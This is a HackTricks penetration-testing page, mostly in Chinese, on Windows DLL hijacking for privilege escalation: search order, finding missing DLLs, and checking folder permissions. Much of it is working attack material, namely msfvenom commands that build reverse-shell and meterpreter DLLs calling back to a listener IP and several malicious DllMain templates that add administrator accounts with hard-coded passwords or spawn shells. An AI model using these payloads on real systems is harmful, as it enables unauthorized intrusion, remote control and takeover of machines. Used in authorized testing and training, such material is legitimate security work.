# Dll Hijacking

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **注册** **Intigriti**，这是一个**由黑客为黑客创建的高级漏洞赏金平台**！今天就加入我们，开始赚取高达**$100,000**的赏金，访问[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)！

{% embed url="https://go.intigriti.com/hacktricks" %}

## Basic Information

DLL Hijacking涉及操纵受信任的应用程序加载恶意DLL。这个术语涵盖了几种策略，如**DLL Spoofing、Injection和Side-Loading**。它主要用于代码执行、实现持久性，以及较少见的权限提升。尽管这里的重点是提升，但劫持的方法在不同目标之间保持一致。

### Common Techniques

用于DLL劫持的几种方法，每种方法的有效性取决于应用程序的DLL加载策略：

1. **DLL Replacement**: 用恶意DLL替换真实DLL，选择性地使用DLL Proxying以保留原始DLL的功能。
2. **DLL Search Order Hijacking**: 将恶意DLL放置在合法DLL之前的搜索路径中，利用应用程序的搜索模式。
3. **Phantom DLL Hijacking**: 创建一个恶意DLL供应用程序加载，认为它是一个不存在的必需DLL。
4. **DLL Redirection**: 修改搜索参数，如`%PATH%`或`.exe.manifest` / `.exe.local`文件，以引导应用程序加载恶意DLL。
5. **WinSxS DLL Replacement**: 在WinSxS目录中用恶意DLL替换合法DLL，这种方法通常与DLL侧加载相关。
6. **Relative Path DLL Hijacking**: 将恶意DLL放置在用户控制的目录中，与复制的应用程序一起，类似于二进制代理执行技术。

## Finding missing Dlls

在系统中查找缺失的DLL最常见的方法是从sysinternals运行[procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)，**设置** **以下两个过滤器**：

![](<../../images/image (311).png>)

![](<../../images/image (313).png>)

并仅显示**文件系统活动**：

![](<../../images/image (314).png>)

如果您在寻找**缺失的dll**，可以**让它运行几秒钟**。\
如果您在寻找**特定可执行文件中的缺失dll**，则应设置**另一个过滤器，如“进程名称” “包含” "\<exec name>"，执行它，然后停止捕获事件**。

## Exploiting Missing Dlls

为了提升权限，我们最好的机会是能够**编写一个特权进程将尝试加载的dll**，在**将要搜索的某个位置**。因此，我们将能够在**dll被搜索的文件夹中**写入一个dll，而这个文件夹在**原始dll**所在的文件夹之前（奇怪的情况），或者我们将能够在**dll将要被搜索的某个文件夹中**写入，而原始**dll在任何文件夹中都不存在**。

### Dll Search Order

**在** [**Microsoft文档**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **中，您可以找到DLL的具体加载方式。**

**Windows应用程序**通过遵循一组**预定义的搜索路径**来查找DLL，遵循特定的顺序。当有害DLL被战略性地放置在这些目录之一时，DLL劫持的问题就出现了，确保它在真实DLL之前被加载。防止这种情况的解决方案是确保应用程序在引用所需DLL时使用绝对路径。

您可以在32位系统上看到**DLL搜索顺序**如下：

1. 应用程序加载的目录。
2. 系统目录。使用[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)函数获取该目录的路径。(_C:\Windows\System32_)
3. 16位系统目录。没有函数获取该目录的路径，但会进行搜索。(_C:\Windows\System_)
4. Windows目录。使用[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)函数获取该目录的路径。(_C:\Windows_)
5. 当前目录。
6. 在PATH环境变量中列出的目录。请注意，这不包括由**App Paths**注册表项指定的每个应用程序路径。在计算DLL搜索路径时不使用**App Paths**键。

这是启用**SafeDllSearchMode**的**默认**搜索顺序。当禁用时，当前目录提升到第二位。要禁用此功能，请创建**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**注册表值并将其设置为0（默认启用）。

如果调用[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)函数时使用**LOAD_WITH_ALTERED_SEARCH_PATH**，搜索将从**LoadLibraryEx**正在加载的可执行模块的目录开始。

最后，请注意**dll可以通过指示绝对路径而不是仅仅是名称来加载**。在这种情况下，该dll**只会在该路径中被搜索**（如果dll有任何依赖项，它们将被视为仅按名称加载进行搜索）。

还有其他方法可以更改搜索顺序，但我在这里不打算解释它们。

#### Exceptions on dll search order from Windows docs

Windows文档中指出了标准DLL搜索顺序的某些例外：

- 当遇到**与内存中已加载的DLL同名的DLL**时，系统会绕过通常的搜索。相反，它会在默认使用内存中已加载的DLL之前进行重定向和清单检查。在这种情况下，系统不会进行DLL搜索。
- 在DLL被识别为当前Windows版本的**已知DLL**的情况下，系统将使用其版本的已知DLL及其任何依赖DLL，**跳过搜索过程**。注册表项**HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**保存这些已知DLL的列表。
- 如果**DLL有依赖项**，则对这些依赖DLL的搜索将像仅通过其**模块名称**指示一样进行，而不管初始DLL是否通过完整路径识别。

### Escalating Privileges

**Requirements**:

- 确定一个在**不同权限**下运行或将要运行的进程（水平或侧向移动），该进程**缺少DLL**。
- 确保在**DLL**将被**搜索的**任何**目录**中有**写入访问权限**。此位置可能是可执行文件的目录或系统路径中的目录。

是的，要求很难找到，因为**默认情况下，找不到缺少dll的特权可执行文件**，而且在系统路径文件夹中拥有写入权限甚至**更奇怪**（默认情况下您无法）。但是，在配置错误的环境中，这是可能的。\
如果您运气好，满足要求，您可以查看[UACME](https://github.com/hfiref0x/UACME)项目。即使**该项目的主要目标是绕过UAC**，您也可能会在那里找到一个Windows版本的DLL劫持的**PoC**（可能只需更改您有写入权限的文件夹的路径）。

请注意，您可以通过以下方式**检查文件夹中的权限**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并**检查PATH中所有文件夹的权限**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
您还可以使用以下命令检查可执行文件的导入和 DLL 的导出：
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
对于如何**利用Dll劫持提升权限**的完整指南，检查：

{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### 自动化工具

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)将检查您是否对系统PATH中的任何文件夹具有写入权限。\
其他发现此漏洞的有趣自动化工具包括**PowerSploit函数**：_Find-ProcessDLLHijack_，_Find-PathDLLHijack_和_Write-HijackDll_。

### 示例

如果您发现一个可利用的场景，成功利用它的最重要的事情之一是**创建一个导出至少所有可执行文件将从中导入的函数的dll**。无论如何，请注意，Dll劫持在[**从中等完整性级别提升到高完整性（绕过UAC）**](../authentication-credentials-uac-and-efs.md#uac)或从[**高完整性提升到SYSTEM**](./#from-high-integrity-to-system)**时非常有用。**您可以在这个专注于执行的dll劫持研究中找到**如何创建有效dll**的示例：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
此外，在**下一节**中，您可以找到一些**基本dll代码**，这些代码可能作为**模板**或用于创建**导出非必需函数的dll**。

## **创建和编译Dll**

### **Dll代理**

基本上，**Dll代理**是一个能够**在加载时执行您的恶意代码**的Dll，同时也能**暴露**并**按预期工作**，通过**将所有调用转发到真实库**。

使用工具[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)或[**Spartacus**](https://github.com/Accenture/Spartacus)，您可以**指定一个可执行文件并选择要代理的库**，并**生成一个代理dll**，或**指定Dll并生成一个代理dll**。

### **Meterpreter**

**获取反向shell (x64)：**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取一个 meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建用户（x86 我没有看到 x64 版本）：**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 你自己的

请注意，在多个情况下，您编译的 Dll 必须 **导出多个函数**，这些函数将被受害者进程加载，如果这些函数不存在，**二进制文件将无法加载**它们，**攻击将失败**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## 参考

- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>

**漏洞赏金提示**：**注册** **Intigriti**，一个由黑客为黑客创建的高级**漏洞赏金平台**！今天就加入我们，访问 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达 **$100,000** 的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

{{#include ../../banners/hacktricks-training.md}}
